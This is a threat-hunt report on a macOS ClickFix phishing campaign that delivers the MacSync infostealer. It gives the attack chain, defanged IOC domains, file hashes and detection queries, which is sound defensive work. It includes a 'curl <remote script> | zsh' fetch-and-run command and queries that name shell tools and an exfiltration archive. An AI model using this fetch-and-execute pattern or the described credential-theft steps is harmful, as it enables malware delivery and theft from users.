# Threat Hunt Report | macOS ClickFix Campaign Delivering MacSync Infostealer

---

# 1. Introduction

This report documents a proactive threat hunt conducted to assess potential exposure to a **macOS-focused infostealer campaign** leveraging **ClickFix-style social engineering**.

The campaign delivers the **MacSync infostealer**, a Malware-as-a-Service (MaaS) variant designed to steal:

- Credentials
- Cryptocurrency assets
- Sensitive files

The malware may also establish **long-term persistence** within the compromised environment.

---

# 2. Executive Summary

A phishing campaign was identified that deceives macOS users into manually executing **Terminal commands disguised as legitimate software installation steps**.

This technique bypasses native macOS security controls such as:

- Gatekeeper
- Code signing validation
- Notarization checks

Once executed, the malware can harvest:

- Passwords
- Browser data
- Cryptocurrency wallets
- Sensitive files

It may also modify trusted applications to maintain persistence.

**Finding**

No confirmed malicious activity was observed within the monitored customer environment during this hunt.

---

# 3. Threat Hypothesis

## Hypothesis

A threat actor may leverage phishing domains and ClickFix-style lures to convince macOS users to execute malicious Terminal commands, leading to deployment of the **MacSync infostealer** and potential credential theft.

---

## Attack Vectors

- Phishing domains impersonating Microsoft or macOS services
- User-assisted execution (copy-paste into Terminal)
- Script-based execution chain (`curl → zsh → osascript`)
- Abuse of trusted Electron-based cryptocurrency applications

---

# 4. Attack Chain

## Step 1 — Initial Access (Phishing / Redirect)

The victim visits a phishing domain or is redirected through compromised infrastructure to a **fake macOS download page**.

Example: Microsoft-themed login lure.

---

## Step 2 — Social Engineering (ClickFix Lure)

The landing page mimics a legitimate macOS cloud storage installer and instructs the user to paste a Terminal command to:

> “Complete installation”

---

## Step 3 — User Execution (Terminal Command)

The pasted command fetches remote content using `curl` and pipes it directly into `zsh`.

Example execution chain:

```
curl <remote script> | zsh
```

This bypasses:

- Gatekeeper
- Notarization
- Signature verification

---

## Step 4 — Stage-1 Loader (Zsh Stager)

The downloaded Zsh script:

- Daemonizes itself
- Suppresses output
- Establishes communication with attacker infrastructure

---

## Step 5 — Stage-2 Payload (AppleScript Execution)

The loader retrieves an **AppleScript payload** and executes it in-memory using:

```
osascript
```

This avoids disk-based detection.

---

## Step 6 — Credential Phishing

AppleScript repeatedly displays fake macOS authentication dialogs until the user enters their **macOS login password**.

---

## Step 7 — Data Collection

The malware harvests:

- Browser credentials and cookies
- Cryptocurrency wallet extensions
- Desktop wallet applications
- macOS Keychain databases
- SSH credentials
- Cloud and messaging session data
- Sensitive user files (size-limited)

---

## Step 8 — Data Exfiltration

Collected data is compressed into:

```
/tmp/osalogging.zip
```

The archive is then exfiltrated via HTTP POST requests to rotating **command-and-control domains**.

---

## Step 9 — Persistence (Conditional)

If detection occurs, trusted **Electron-based cryptocurrency wallet applications** may be trojanized to enable:

- Delayed phishing prompts
- Long-term attacker access

---

# 5. Methodology

## Hunt Approach

The investigation followed a structured threat-hunting methodology:

- Intelligence-led hypothesis testing
- Behavior-based validation instead of IOC-only matching
- Cross-correlation of endpoint and network telemetry

---

## Data Sources Reviewed

- Endpoint logs
- Process execution telemetry
- Firewall and network DNS logs
- HTTP network telemetry

---

# 6. Indicators of Compromise (IOCs)

## Phishing / Lure Domains

```
macclouddrive[.]com
maccloudvault[.]com
maccloudsafe[.]com
macfiledrive[.]com
macfilevault[.]com
macfilebackup[.]com
```

---

## Command-and-Control Domains

```
jmpbowl[.]xyz
jmpbowl[.]today
jmpbowl[.]space
jmpbowl[.]top
jmpbowl[.]world
jmpbowl[.]shop
jmpbowl[.]fun
jmpbowl[.]coupons
```

---

## File Hashes (SHA256)

**app.asar**

```
ec6bc84be18ce4cb55fb915370c00f2a836ffefc65c6b728efb8d2d28036e376
```

**Info.plist**

```
c99dea85f0ef8d3e2f3771c8ebd02d7dee0d90efc5c8392e5c266a59640a4206
```

---

# 7. Detection Queries

## A. Endpoint Detection

### Suspicious Terminal Execution Chain

```
process.name:(curl or zsh or osascript)
and process.command_line:( "*curl*" and "*zsh*" or "*http*" or "*https*" )
```

---

### Suspicious Temporary Artifact Creation

```
event.category:file
and file.path:"/tmp/osalogging.zip"
```

---

### Electron Application Tampering

```
file.path:"*/Applications/*/Contents/Resources/app.asar"
```

---

## B. Firewall / Network Detection (Elastic)

### Outbound Communication to Known C2 Domains

```
event.category:network and
dns.question.name:(
  "jmpbowl.xyz" or "jmpbowl.today" or "jmpbowl.space"
  or "jmpbowl.top" or "jmpbowl.world"
  or "jmpbowl.shop" or "jmpbowl.fun"
  or "jmpbowl.coupons"
)
```

---

### Suspicious HTTP POST Exfiltration

```
http.request.method:"POST"
and url.path:"/gate"
```

---

### Encoded Payload Delivery

```
event.category:network
and http.request.body:("*base64*")
```

---

# 8. Impact Assessment

## Potential Impact

If exploited successfully, the campaign could result in:

- Complete credential compromise
- Cryptocurrency theft
- Exfiltration of sensitive files
- Long-term persistence through trusted applications
- Delayed detection due to user-driven execution

---

## Risk Level

**High**

Reason:

- Credential theft
- Financial impact
- Persistence potential

---
